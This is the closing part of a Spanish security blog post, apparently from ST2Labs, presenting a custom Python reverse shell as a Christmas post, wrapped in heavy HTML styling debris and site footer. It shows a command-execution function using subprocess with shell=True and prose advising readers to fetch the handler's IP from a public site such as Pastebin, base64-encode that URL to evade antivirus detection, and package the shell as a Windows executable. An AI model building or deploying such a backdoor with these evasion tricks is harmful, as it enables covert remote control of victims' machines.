+
+<colgroup>
+
+<col style="width: 50%" />
+
+<col style="width: 50%" />
+
+</colgroup>
+
+<tbody>
+
+<tr class="odd">
+
+<td><div class="line number1 index0 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+1
+
+</div>
+
+<div class="line number2 index1 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+2
+
+</div>
+
+<div class="line number3 index2 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+3   
+
+</div>
+
+<div class="line number4 index3 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+4
+
+</div>
+
+<div class="line number5 index4 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+5
+
+</div>
+
+<div class="line number6 index5 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+6
+
+</div>
+
+<div class="line number7 index6 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+7
+
+</div>
+
+<div class="line number8 index7 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+8
+
+</div>
+
+<div class="line number9 index8 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+9
+
+</div>
+
+<div class="line number10 index9 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+10
+
+</div></td>
+
+<td><div class="container" style="background-attachment: initial !important; background-clip: initial !important; background-image: none !important; background-origin: initial !important; background-position: initial !important; background-repeat: initial !important; background-size: initial !important; border-radius: 0px !important; border: 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: relative !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">
+
+<div class="line number1 index0 alt2" style="background: none white !important; border-radius: 0px !important; border: 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 1em !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+<span style="color: #006699; font-size: 1em; font-weight: bold; line-height: 1.1em;">def</span> run_cmd(data):<br />
+
+<span style="font-size: 1em; line-height: 1.1em;">      proc = subprocess.Popen(data,</span><br />
+
+                                     shell=True,<br />
+
+                stdout=subprocess.PIPE,<br />
+
+                 stderr=subprocess.PIPE,<br />
+
+                  stdin=subprocess.PIPE)<br />
+
+      stdout = proc.stdout.read() + proc.stderr.read()<br />
+
+      return stdout
+
+</div>
+
+<div class="line number2 index1 alt1" style="background: none white !important; border-radius: 0px !important; border: 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 1em !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+<br />
+
+
+
+</div>
+
+</div></td>
+
+</tr>
+
+</tbody>
+
+</table>
+
+<p>He utilizado subprocess para la ejecución de &ldquo;comandos&rdquo; en el sistema</p>
+
+<p>remoto. Estoy seguro que mas de uno esta pensando técnicas para mejorar</p>
+
+<p>la shell, implementar nuevos comandos, etc. Por ejemplo, la IP podría</p>
+
+<p>cogerla de un registro DNS, o de un recurso WEB publico, para evitar</p>
+
+<p>hardcodear (incrustar) la IP dentro del código fuente. Se recomienda,</p>
+
+<p>hardcodear en base64 la URL del recurso WEB para determinar la IP del</p>
+
+<p>&ldquo;handler&rdquo; y tratar de evitar la detección como malware por los antivirus</p>
+
+<p>(*Alguien se anima a mejorar la Shell implementando la obtención de la</p>
+
+<p>IP desde un recurso web publico como pastenBIN?*)</p>
+
+<p>Compatible tanto en Windows como en Linux, se puede crear un ejecutable</p>
+
+<p>para Windows utilizando pyexe o pyinstaller.</p>
+
+<p>Es un &ldquo;shell&rdquo; muy simple pero efectiva. Os invito a probarla y comentar</p>
+
+<p>las limitaciones que tiene la Shell y como se podrían solventar!</p>
+
+<p>Por supuesto, os dejo como trabajo para casa, la creación del &ldquo;cliente&rdquo;</p>
+
+<p>que se conecta y maneja la conexión inversa con la shell .. xD</p>
+
+<p>#ST2 #ST2Labs os desea:</p>
+
+<p>&lt;span</p>
+
+<p>style=&ldquo;border: none; font-size: small; list-style: circle inside; margin: 0px; outline: none; padding: 0px;&ldquo;&gt;**&lt;span</p>
+
+<p>style=&ldquo;border: none; color: #777777; font-family: Arial, &lsquo;Century gothic&rsquo;, sans-serif; list-style: circle inside; margin: 0px; outline: none; padding: 0px; text-align: start;&ldquo;&gt;¡¡¡FeliZ</p>
+
+<p>Navidad!!!</span>&lt;span id=&ldquo;result_box&rdquo; class=&ldquo;short_text&rdquo; lang=&ldquo;en&rdquo;</p>
+
+<p>style=&ldquo;border: 0px; color: #777777; font-family: Arial, &lsquo;Century gothic&rsquo;, sans-serif; list-style: circle inside; margin: 0px; outline: 0px; padding: 0px; text-align: start; vertical-align: baseline;&ldquo;&gt; -</p>
+
+<p>Merry Christmas - </span>&lt;span id=&ldquo;result_box&rdquo; class=&ldquo;short_text&rdquo;</p>
+
+<p>lang=&ldquo;fr&rdquo;</p>
+
+<p>style=&ldquo;border: 0px; color: #777777; font-family: Arial, &lsquo;Century gothic&rsquo;, sans-serif; list-style: circle inside; margin: 0px; outline: 0px; padding: 0px; text-align: start; vertical-align: baseline;&ldquo;&gt;Joyeux</p>
+
+<p>Noël - </span>&lt;span id=&ldquo;result_box&rdquo; class=&ldquo;short_text&rdquo; lang=&ldquo;de&rdquo;</p>
+
+<p>style=&ldquo;border: 0px; color: #777777; font-family: Arial, &lsquo;Century gothic&rsquo;, sans-serif; list-style: circle inside; margin: 0px; outline: 0px; padding: 0px; text-align: start; vertical-align: baseline;&ldquo;&gt;Frohe</p>
+
+<p>Weihnachten - </span>&lt;span id=&ldquo;result_box&rdquo; class=&ldquo;short_text&rdquo; lang=&ldquo;ru&rdquo;</p>
+
+<p>style=&ldquo;border: 0px; color: #777777; font-family: Arial, &lsquo;Century gothic&rsquo;, sans-serif; list-style: circle inside; margin: 0px; outline: 0px; padding: 0px; text-align: start; vertical-align: baseline;&ldquo;&gt;С</p>
+
+<p>Рождеством - </span>&lt;span id=&ldquo;result_box&rdquo; class=&ldquo;short_text&rdquo;</p>
+
+<p>lang=&ldquo;zh-CN&rdquo;</p>
+
+<p>style=&ldquo;border: 0px; color: #777777; font-family: Arial, &lsquo;Century gothic&rsquo;, sans-serif; list-style: circle inside; margin: 0px; outline: 0px; padding: 0px; text-align: start; vertical-align: baseline;&ldquo;&gt;圣诞节快乐</p>
+
+<p>- </span>&lt;span id=&ldquo;result_box&rdquo; class=&ldquo;short_text&rdquo; lang=&ldquo;it&rdquo;</p>
+
+<p>style=&ldquo;border: 0px; color: #777777; font-family: Arial, &lsquo;Century gothic&rsquo;, sans-serif; list-style: circle inside; margin: 0px; outline: 0px; padding: 0px; text-align: start; vertical-align: baseline;&ldquo;&gt;Buon</p>
+
+<p>Natale - </span>&lt;span id=&ldquo;result_box&rdquo; class=&ldquo;short_text&rdquo; lang=&ldquo;sv&rdquo;</p>
+
+<p>style=&ldquo;border: 0px; color: #777777; font-family: Arial, &lsquo;Century gothic&rsquo;, sans-serif; list-style: circle inside; margin: 0px; outline: 0px; padding: 0px; text-align: start; vertical-align: baseline;&ldquo;&gt;God</p>
+
+<p>Jul -</span>&lt;span id=&ldquo;result_box&rdquo; class=&ldquo;short_text&rdquo; lang=&ldquo;pt&rdquo;</p>
+
+<p>style=&ldquo;border: 0px; color: #777777; font-family: Arial, &lsquo;Century gothic&rsquo;, sans-serif; list-style: circle inside; margin: 0px; outline: 0px; padding: 0px; text-align: start; vertical-align: baseline;&ldquo;&gt;Feliz</p>
+
+<p>Natal &hellip;</span>**</span></p>
+
+<p>&lt;span</p>
+
+<p>style=&ldquo;border: none; font-size: small; list-style: circle inside; margin: 0px; outline: none; padding: 0px;&ldquo;&gt;**&lt;span</p>
+
+<p>class=&ldquo;short_text&rdquo; lang=&ldquo;pt&rdquo;</p>
+
+<p>style=&ldquo;border: 0px; color: #777777; font-family: Arial, &lsquo;Century gothic&rsquo;, sans-serif; list-style: circle inside; margin: 0px; outline: 0px; padding: 0px; text-align: start; vertical-align: baseline;&ldquo;&gt;</p>
+
+<p></span>**</span></p>
+
+<p>@rhodius | @seguridadxato2 | @st2labs</p>
+
+<p><span style="font-size: x-small;">[*] Basada en el código</p>
+
+<p>de </span><a href="http://www.primalsecurity.net/0xc-python-tutorial-python-malware/?utm_content=bufferda5e8&amp;utm_medium=social&amp;utm_source=twitter.com&amp;utm_campaign=buffer">primalsecurity</a></p>
+
+
+        
+          <div class="blog-tags">
+            
+              <a href="https://st2labs.github.io/tags/2015/">2015</a>&nbsp;
+            
+              <a href="https://st2labs.github.io/tags/shell/">Shell</a>&nbsp;
+            
+              <a href="https://st2labs.github.io/tags/python/">Python</a>&nbsp;
+            
+              <a href="https://st2labs.github.io/tags/xmas/">XMas</a>&nbsp;
+            
+              <a href="https://st2labs.github.io/tags/st2blog/">ST2Blog</a>&nbsp;
+            
+              <a href="https://st2labs.github.io/tags/st2labs/">ST2Labs</a>&nbsp;
+            
+              <a href="https://st2labs.github.io/tags/base64/">Base64</a>&nbsp;
+            
+              <a href="https://st2labs.github.io/tags/code/">Code</a>&nbsp;
+            
+              <a href="https://st2labs.github.io/tags/reverse/">Reverse</a>&nbsp;
+            
+          </div>
+        
+
+        
+            <hr/>
+            <section id="social-share">
+              <div class="list-inline footer-links">
+                
+
+<div class="share-box" aria-hidden="true">
+    <ul class="share">
+      
+      <li>
+        <a href="//twitter.com/share?url=https%3a%2f%2fst2labs.github.io%2fpost%2f2015-12-23-feliz-navidad-with-custom-python-reverse-shell%2f&amp;text=Feliz%20Navidad%20with%20Custom%20Python%20Reverse%20Shell&amp;via=seguridadxato2" target="_blank" title="Share on Twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fst2labs.github.io%2fpost%2f2015-12-23-feliz-navidad-with-custom-python-reverse-shell%2f" target="_blank" title="Share on Facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//reddit.com/submit?url=https%3a%2f%2fst2labs.github.io%2fpost%2f2015-12-23-feliz-navidad-with-custom-python-reverse-shell%2f&amp;title=Feliz%20Navidad%20with%20Custom%20Python%20Reverse%20Shell" target="_blank" title="Share on Reddit">
+          <i class="fab fa-reddit"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fst2labs.github.io%2fpost%2f2015-12-23-feliz-navidad-with-custom-python-reverse-shell%2f&amp;title=Feliz%20Navidad%20with%20Custom%20Python%20Reverse%20Shell" target="_blank" title="Share on LinkedIn">
+          <i class="fab fa-linkedin"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fst2labs.github.io%2fpost%2f2015-12-23-feliz-navidad-with-custom-python-reverse-shell%2f&amp;title=Feliz%20Navidad%20with%20Custom%20Python%20Reverse%20Shell" target="_blank" title="Share on StumbleUpon">
+          <i class="fab fa-stumbleupon"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2fst2labs.github.io%2fpost%2f2015-12-23-feliz-navidad-with-custom-python-reverse-shell%2f&amp;description=Feliz%20Navidad%20with%20Custom%20Python%20Reverse%20Shell" target="_blank" title="Share on Pinterest">
+          <i class="fab fa-pinterest"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+  
+
+              </div>
+            </section>
+        
+
+        
+          
+            
+          
+
+          
+                  <h4 class="see-also">Ver también</h4>
+                  <ul>
+                
+                
+                    <li><a href="/post/2017-09-14-cymon-analyzer-modulo-de-analisis-reputacion-ip-en-cymon-io-para-cortex-engine-thehive-project/">[cymon-analyzer] | Modulo de Análisis Reputación IP en Cymon.io para Cortex Engine | theHive-project</a></li>
+                
+                    <li><a href="/post/2016-04-01-sipi-simple-ip-information-tool-is-out/">[SIPI] Simple IP Information Tool is out</a></li>
+                
+                    <li><a href="/post/2015-10-19-windows-forensics-tips-usb-write-protected/">Windows Forensics Tips - USB Write Protected</a></li>
+                
+                    <li><a href="/post/2015-07-03-3ed-master-seguridad-tic-15-16-abierto-plazo-de-matriculacion/">3Ed - Máster Seguridad TIC 15/16 - Abierto Plazo de Matriculación</a></li>
+                
+                    <li><a href="/post/2015-05-23-ii-jornada-de-seguridad-en-las-comunicaciones-y-la-informacion/">II Jornada de Seguridad en las Comunicaciones y la Información</a></li>
+                
+              </ul>
+
+          
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://st2labs.github.io/post/2015-12-16-digital-forensics-of-android-whatsapp-sqlite-database-part-iii/" data-toggle="tooltip" data-placement="top" title="Digital Forensics of Android WhatsApp SQLite Database (Part III)">&larr; Artículo anterior</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://st2labs.github.io/post/2016-03-17-svtcloud-monitoring-security-operations-center-msoc/" data-toggle="tooltip" data-placement="top" title="SVTCloud Monitoring &amp; Security Operations Center (MSOC)">Artículo siguiente &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="mailto:info@seguridadparatodos.es" title="Email me">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://github.com/st2labs" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://twitter.com/seguridadxato2" title="Twitter">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://linkedin.com/in/julianjgonzalez" title="LinkedIn">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+          <li>
+            <a href="" title="RSS">
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+            
+              <a href="www.st2labs.com">Julian J Gonzalez</a>
+            
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            2019
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://st2labs.github.io">Seguridad para Todos</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.54.0</a> alimentada &nbsp;&bull;&nbsp; Tema <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adaptado de <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+<script src="https://st2labs.github.io/js/main.js"></script>
+<script src="https://st2labs.github.io/js/highlight.min.js"></script>
+<script> hljs.initHighlightingOnLoad(); </script>
+<script> $(document).ready(function() {$("pre.chroma").css("padding","0");}); </script><script> renderMathInElement(document.body); </script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://st2labs.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
